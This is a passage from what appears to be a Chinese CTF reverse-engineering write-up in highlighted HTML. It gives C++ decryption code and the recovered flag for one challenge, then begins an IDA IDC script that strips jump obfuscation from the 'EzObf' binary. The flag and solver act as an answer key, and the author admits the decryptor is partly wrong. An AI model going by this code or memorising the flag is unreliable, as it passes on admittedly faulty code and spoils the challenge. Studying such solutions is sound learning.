number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+=</span> <span class=\"token number\">12</span><span class=\"token punctuation\">;</span>\nInput<span class=\"token punctuation\">[</span><span class=\"token number\">26</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-=</span> <span class=\"token number\">85</span><span class=\"token punctuation\">;</span>\nInput<span class=\"token punctuation\">[</span><span class=\"token number\">35</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-=</span> <span class=\"token number\">12</span><span class=\"token punctuation\">;</span>\nInput<span class=\"token punctuation\">[</span><span class=\"token number\">14</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+=</span> <span class=\"token number\">9</span><span class=\"token punctuation\">;</span>\nInput<span class=\"token punctuation\">[</span><span class=\"token number\">27</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-=</span> <span class=\"token number\">6</span><span class=\"token punctuation\">;</span>\nInput<span class=\"token punctuation\">[</span><span class=\"token number\">6</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^=</span> <span class=\"token number\">5</span><span class=\"token punctuation\">;</span>\nInput<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^=</span> <span class=\"token number\">5</span><span class=\"token punctuation\">;</span>\nInput<span class=\"token punctuation\">[</span><span class=\"token number\">27</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+=</span> <span class=\"token number\">14</span><span class=\"token punctuation\">;</span>\nInput<span class=\"token punctuation\">[</span><span class=\"token number\">25</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+=</span> <span class=\"token number\">3</span><span class=\"token punctuation\">;</span>\nInput<span class=\"token punctuation\">[</span><span class=\"token number\">26</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+=</span> <span class=\"token number\">4</span><span class=\"token punctuation\">;</span>\nInput<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^=</span> <span class=\"token number\">8</span><span class=\"token punctuation\">;</span>\nInput<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-=</span> <span class=\"token number\">12</span><span class=\"token punctuation\">;</span>\nInput<span class=\"token punctuation\">[</span><span class=\"token number\">12</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+=</span> <span class=\"token number\">10</span><span class=\"token punctuation\">;</span>\nInput<span class=\"token punctuation\">[</span><span class=\"token number\">37</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-=</span> <span class=\"token number\">2</span><span class=\"token punctuation\">;</span>\nInput<span class=\"token punctuation\">[</span><span class=\"token number\">32</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-=</span> <span class=\"token number\">2</span><span class=\"token punctuation\">;</span>\nInput<span class=\"token punctuation\">[</span><span class=\"token number\">9</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-=</span> <span class=\"token number\">12</span><span class=\"token punctuation\">;</span>\nInput<span class=\"token punctuation\">[</span><span class=\"token number\">26</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^=</span> <span class=\"token number\">5</span><span class=\"token punctuation\">;</span>\nInput<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+=</span> <span class=\"token number\">13</span><span class=\"token punctuation\">;</span>\nInput<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^=</span> <span class=\"token number\">15</span><span class=\"token punctuation\">;</span>\nInput<span class=\"token punctuation\">[</span><span class=\"token number\">10</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+=</span> <span class=\"token number\">14</span><span class=\"token punctuation\">;</span>\nInput<span class=\"token punctuation\">[</span><span class=\"token number\">16</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-=</span> <span class=\"token number\">7</span><span class=\"token punctuation\">;</span>\nInput<span class=\"token punctuation\">[</span><span class=\"token number\">12</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-=</span> <span class=\"token number\">7</span><span class=\"token punctuation\">;</span>\nInput<span class=\"token punctuation\">[</span><span class=\"token number\">34</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^=</span> <span class=\"token number\">8</span><span class=\"token punctuation\">;</span>\nInput<span class=\"token punctuation\">[</span><span class=\"token number\">21</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^=</span> <span class=\"token number\">10</span><span class=\"token punctuation\">;</span>\nInput<span class=\"token punctuation\">[</span><span class=\"token number\">39</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-=</span> <span class=\"token number\">126</span><span class=\"token punctuation\">;</span>\nInput<span class=\"token punctuation\">[</span><span class=\"token number\">7</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+=</span> <span class=\"token number\">2</span><span class=\"token punctuation\">;</span>\nInput<span class=\"token punctuation\">[</span><span class=\"token number\">15</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^=</span> <span class=\"token number\">3</span><span class=\"token punctuation\">;</span>\nInput<span class=\"token punctuation\">[</span><span class=\"token number\">10</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^=</span> <span class=\"token number\">10</span><span class=\"token punctuation\">;</span>\nInput<span class=\"token punctuation\">[</span><span class=\"token number\">34</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-=</span> <span class=\"token number\">11</span><span class=\"token punctuation\">;</span>\nInput<span class=\"token punctuation\">[</span><span class=\"token number\">18</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+=</span> <span class=\"token number\">8</span><span class=\"token punctuation\">;</span>\nInput<span class=\"token punctuation\">[</span><span class=\"token number\">25</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+=</span> <span class=\"token number\">9</span><span class=\"token punctuation\">;</span>\nInput<span class=\"token punctuation\">[</span><span class=\"token number\">14</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^=</span> <span class=\"token number\">6</span><span class=\"token punctuation\">;</span>\nInput<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^=</span> <span class=\"token number\">5</span><span class=\"token punctuation\">;</span>\nInput<span class=\"token punctuation\">[</span><span class=\"token number\">10</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-=</span> <span class=\"token number\">8</span><span class=\"token punctuation\">;</span>\nInput<span class=\"token punctuation\">[</span><span class=\"token number\">27</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^=</span> <span class=\"token number\">7</span><span class=\"token punctuation\">;</span>\nInput<span class=\"token punctuation\">[</span><span class=\"token number\">13</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^=</span> <span class=\"token number\">6</span><span class=\"token punctuation\">;</span>\nInput<span class=\"token punctuation\">[</span><span class=\"token number\">13</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^=</span> <span class=\"token number\">4</span><span class=\"token punctuation\">;</span>\nInput<span class=\"token punctuation\">[</span><span class=\"token number\">23</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^=</span> <span class=\"token number\">12</span><span class=\"token punctuation\">;</span>\nInput<span class=\"token punctuation\">[</span><span class=\"token number\">34</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^=</span> <span class=\"token number\">14</span><span class=\"token punctuation\">;</span>\nInput<span class=\"token punctuation\">[</span><span class=\"token number\">18</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+=</span> <span class=\"token number\">52</span><span class=\"token punctuation\">;</span>\nInput<span class=\"token punctuation\">[</span><span class=\"token number\">38</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-=</span> <span class=\"token number\">119</span><span class=\"token punctuation\">;</span></code></pre>\n\n<p>这也就是第一层加密的解密代码。</p>\n<p>第二层加密直接对着写即可，我写的有点问题（懒得改），其中几个字节解密不对，不过根据解密出的flag也能猜出是啥，替换完那几个字节就得到完整的flag。</p>\n<p>完整解密代码：</p>\n<pre class=\"language-cpp\" data-language=\"cpp\"><code class=\"language-cpp\"><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;iostream></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;windows.h></span></span>\n\n<span class=\"token keyword\">void</span> <span class=\"token function\">decrypt_func</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>data<span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span> len<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">char</span> temp<span class=\"token punctuation\">[</span><span class=\"token number\">40</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">memcpy</span><span class=\"token punctuation\">(</span>temp<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">,</span> <span class=\"token number\">40</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token number\">10</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">int</span> base <span class=\"token operator\">=</span> <span class=\"token number\">4</span> <span class=\"token operator\">*</span> i<span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">char</span> block<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>base <span class=\"token operator\">&lt;</span> len<span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">&#123;</span>\n            block<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>temp<span class=\"token punctuation\">[</span>base <span class=\"token operator\">+</span> <span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0x1F</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">|</span> <span class=\"token punctuation\">(</span>temp<span class=\"token punctuation\">[</span>base <span class=\"token operator\">+</span> <span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">>></span> <span class=\"token number\">3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            block<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>temp<span class=\"token punctuation\">[</span>base<span class=\"token punctuation\">]</span> <span class=\"token operator\">>></span> <span class=\"token number\">3</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">|</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>temp<span class=\"token punctuation\">[</span>base <span class=\"token operator\">+</span> <span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0x07</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            block<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>temp<span class=\"token punctuation\">[</span>base<span class=\"token punctuation\">]</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0x07</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">|</span> <span class=\"token punctuation\">(</span>temp<span class=\"token punctuation\">[</span>base <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">>></span> <span class=\"token number\">3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            block<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>temp<span class=\"token punctuation\">[</span>base <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0x07</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">|</span> <span class=\"token punctuation\">(</span>temp<span class=\"token punctuation\">[</span>base <span class=\"token operator\">+</span> <span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">>></span> <span class=\"token number\">3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n            <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> j <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> j <span class=\"token operator\">&lt;</span> <span class=\"token number\">4</span> <span class=\"token operator\">&amp;&amp;</span> base <span class=\"token operator\">+</span> j <span class=\"token operator\">&lt;</span> len<span class=\"token punctuation\">;</span> j<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">&#123;</span>\n                data<span class=\"token punctuation\">[</span>base <span class=\"token operator\">+</span> j<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> block<span class=\"token punctuation\">[</span>j<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">&#125;</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">char</span> Input<span class=\"token punctuation\">[</span><span class=\"token number\">48</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token number\">0x4A</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xAB</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x9B</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x1B</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x61</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xB1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xF3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x32</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xD1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x8B</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x73</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xEB</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xE9</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x73</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x6B</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x22</span><span class=\"token punctuation\">,</span>\n        <span class=\"token number\">0x81</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x83</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x23</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x31</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xCB</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x1B</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x22</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xFB</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x25</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xC2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x81</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x81</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x73</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x22</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xFA</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x03</span><span class=\"token punctuation\">,</span>\n        <span class=\"token number\">0x9C</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x4B</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x5B</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x49</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x97</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x87</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xDB</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x51</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token function\">decrypt_func</span><span class=\"token punctuation\">(</span>Input<span class=\"token punctuation\">,</span> <span class=\"token number\">40</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    Input<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+=</span> <span class=\"token number\">12</span><span class=\"token punctuation\">;</span>\n    Input<span class=\"token punctuation\">[</span><span class=\"token number\">26</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-=</span> <span class=\"token number\">85</span><span class=\"token punctuation\">;</span>\n    Input<span class=\"token punctuation\">[</span><span class=\"token number\">35</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-=</span> <span class=\"token number\">12</span><span class=\"token punctuation\">;</span>\n    Input<span class=\"token punctuation\">[</span><span class=\"token number\">14</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+=</span> <span class=\"token number\">9</span><span class=\"token punctuation\">;</span>\n    Input<span class=\"token punctuation\">[</span><span class=\"token number\">27</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-=</span> <span class=\"token number\">6</span><span class=\"token punctuation\">;</span>\n    Input<span class=\"token punctuation\">[</span><span class=\"token number\">6</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^=</span> <span class=\"token number\">5</span><span class=\"token punctuation\">;</span>\n    Input<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^=</span> <span class=\"token number\">5</span><span class=\"token punctuation\">;</span>\n    Input<span class=\"token punctuation\">[</span><span class=\"token number\">27</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+=</span> <span class=\"token number\">14</span><span class=\"token punctuation\">;</span>\n    Input<span class=\"token punctuation\">[</span><span class=\"token number\">25</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+=</span> <span class=\"token number\">3</span><span class=\"token punctuation\">;</span>\n    Input<span class=\"token punctuation\">[</span><span class=\"token number\">26</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+=</span> <span class=\"token number\">4</span><span class=\"token punctuation\">;</span>\n    Input<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^=</span> <span class=\"token number\">8</span><span class=\"token punctuation\">;</span>\n    Input<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-=</span> <span class=\"token number\">12</span><span class=\"token punctuation\">;</span>\n    Input<span class=\"token punctuation\">[</span><span class=\"token number\">12</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+=</span> <span class=\"token number\">10</span><span class=\"token punctuation\">;</span>\n    Input<span class=\"token punctuation\">[</span><span class=\"token number\">37</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-=</span> <span class=\"token number\">2</span><span class=\"token punctuation\">;</span>\n    Input<span class=\"token punctuation\">[</span><span class=\"token number\">32</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-=</span> <span class=\"token number\">2</span><span class=\"token punctuation\">;</span>\n    Input<span class=\"token punctuation\">[</span><span class=\"token number\">9</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-=</span> <span class=\"token number\">12</span><span class=\"token punctuation\">;</span>\n    Input<span class=\"token punctuation\">[</span><span class=\"token number\">26</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^=</span> <span class=\"token number\">5</span><span class=\"token punctuation\">;</span>\n    Input<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+=</span> <span class=\"token number\">13</span><span class=\"token punctuation\">;</span>\n    Input<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^=</span> <span class=\"token number\">15</span><span class=\"token punctuation\">;</span>\n    Input<span class=\"token punctuation\">[</span><span class=\"token number\">10</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+=</span> <span class=\"token number\">14</span><span class=\"token punctuation\">;</span>\n    Input<span class=\"token punctuation\">[</span><span class=\"token number\">16</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-=</span> <span class=\"token number\">7</span><span class=\"token punctuation\">;</span>\n    Input<span class=\"token punctuation\">[</span><span class=\"token number\">12</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-=</span> <span class=\"token number\">7</span><span class=\"token punctuation\">;</span>\n    Input<span class=\"token punctuation\">[</span><span class=\"token number\">34</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^=</span> <span class=\"token number\">8</span><span class=\"token punctuation\">;</span>\n    Input<span class=\"token punctuation\">[</span><span class=\"token number\">21</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^=</span> <span class=\"token number\">10</span><span class=\"token punctuation\">;</span>\n    Input<span class=\"token punctuation\">[</span><span class=\"token number\">39</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-=</span> <span class=\"token number\">126</span><span class=\"token punctuation\">;</span>\n    Input<span class=\"token punctuation\">[</span><span class=\"token number\">7</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+=</span> <span class=\"token number\">2</span><span class=\"token punctuation\">;</span>\n    Input<span class=\"token punctuation\">[</span><span class=\"token number\">15</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^=</span> <span class=\"token number\">3</span><span class=\"token punctuation\">;</span>\n    Input<span class=\"token punctuation\">[</span><span class=\"token number\">10</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^=</span> <span class=\"token number\">10</span><span class=\"token punctuation\">;</span>\n    Input<span class=\"token punctuation\">[</span><span class=\"token number\">34</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-=</span> <span class=\"token number\">11</span><span class=\"token punctuation\">;</span>\n    Input<span class=\"token punctuation\">[</span><span class=\"token number\">18</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+=</span> <span class=\"token number\">8</span><span class=\"token punctuation\">;</span>\n    Input<span class=\"token punctuation\">[</span><span class=\"token number\">25</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+=</span> <span class=\"token number\">9</span><span class=\"token punctuation\">;</span>\n    Input<span class=\"token punctuation\">[</span><span class=\"token number\">14</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^=</span> <span class=\"token number\">6</span><span class=\"token punctuation\">;</span>\n    Input<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^=</span> <span class=\"token number\">5</span><span class=\"token punctuation\">;</span>\n    Input<span class=\"token punctuation\">[</span><span class=\"token number\">10</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-=</span> <span class=\"token number\">8</span><span class=\"token punctuation\">;</span>\n    Input<span class=\"token punctuation\">[</span><span class=\"token number\">27</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^=</span> <span class=\"token number\">7</span><span class=\"token punctuation\">;</span>\n    Input<span class=\"token punctuation\">[</span><span class=\"token number\">13</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^=</span> <span class=\"token number\">6</span><span class=\"token punctuation\">;</span>\n    Input<span class=\"token punctuation\">[</span><span class=\"token number\">13</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^=</span> <span class=\"token number\">4</span><span class=\"token punctuation\">;</span>\n    Input<span class=\"token punctuation\">[</span><span class=\"token number\">23</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^=</span> <span class=\"token number\">12</span><span class=\"token punctuation\">;</span>\n    Input<span class=\"token punctuation\">[</span><span class=\"token number\">34</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^=</span> <span class=\"token number\">14</span><span class=\"token punctuation\">;</span>\n    Input<span class=\"token punctuation\">[</span><span class=\"token number\">18</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+=</span> <span class=\"token number\">52</span><span class=\"token punctuation\">;</span>\n    Input<span class=\"token punctuation\">[</span><span class=\"token number\">38</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-=</span> <span class=\"token number\">119</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%.40s\\n\"</span><span class=\"token punctuation\">,</span> Input<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token comment\">// flag&#123;L3@rn-ng_1n_0ld_sch00b_@nd_g3x_j0y&#125; -> flag&#123;L3@rn1ng_1n_0ld_sch00l_@nd_g3t_j0y&#125;</span>\n    <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span></code></pre>\n\n<p>flag{L3@rn1ng_1n_0ld_sch00l_@nd_g3t_j0y}</p>\n<h3 id=\"EzObf\"><a href=\"#EzObf\" class=\"headerlink\" title=\"EzObf\"></a>EzObf</h3><p>main_0函数跟入发现有混淆，红框处为原真实汇编指令，其他都是混淆指令。</p>\n<p>混淆流程：</p>\n<ol>\n<li>执行真实指令</li>\n<li>call $+5执行pop rax，rax就是call时push到栈的返回地址，也就是pop rax指令的地址。</li>\n<li>给ebx赋值，进行rol计算，最后用rax加上或减去（共两种）rbx，得到跳转地址，进行jmp rax。</li>\n</ol>\n<p>之后每jmp过去一次，那边就都是一样的结构，popfq和pushfq之间就是真实汇编。</p>\n<p>deobf的思路即为nop那一堆pop和push，保留真实汇编指令，然后计算跳转地址，手动计算相对地址写jmp，保持代码执行流程。</p>\n<p><img src=\"/images/43-1744626745338-47.png\" loading=\"lazy\"></p>\n<p>deobf idc脚本：</p>\n<pre class=\"language-cpp\" data-language=\"cpp\"><code class=\"language-cpp\"><span class=\"token keyword\">static</span> <span class=\"token function\">NopCode</span><span class=\"token punctuation\">(</span>Addr<span class=\"token punctuation\">,</span> Length<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">auto</span> i<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span>i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> Length<span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">PatchByte</span><span class=\"token punctuation\">(</span>Addr <span class=\"token operator\">+</span> i<span class=\"token punctuation\">,</span> <span class=\"token number\">0x90</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">static</span> <span class=\"token function\">rol</span><span class=\"token punctuation\">(</span>value<span class=\"token punctuation\">,</span> count<span class=\"token punctuation\">,</span> bits <span class=\"token operator\">=</span> <span class=\"token number\">32</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#123;</span>\n    count <span class=\"token operator\">=</span> count <span class=\"token operator\">%</span> bits<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">return</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token generic-function\"><span class=\"token function\">value</span> <span class=\"token generic class-name\"><span class=\"token operator\">&lt;&lt;</span> count<span class=\"token punctuation\">)</span> <span class=\"token operator\">|</span> <span class=\"token punctuation\">(</span>value <span class=\"token operator\">>></span></span></span> <span class=\"token punctuation\">(</span>bits <span class=\"token operator\">-</span> count<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span> <span class=\"token operator\">&lt;&lt;</span> bits<span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token comment\">// 搜索真实汇编代码的下一个地址</span>\n<span class=\"token keyword\">static</span> <span class=\"token function\">FindEnd</span><span class=\"token punctuation\">(</span>Addr<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">auto</span> i<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span>i <span class=\"token 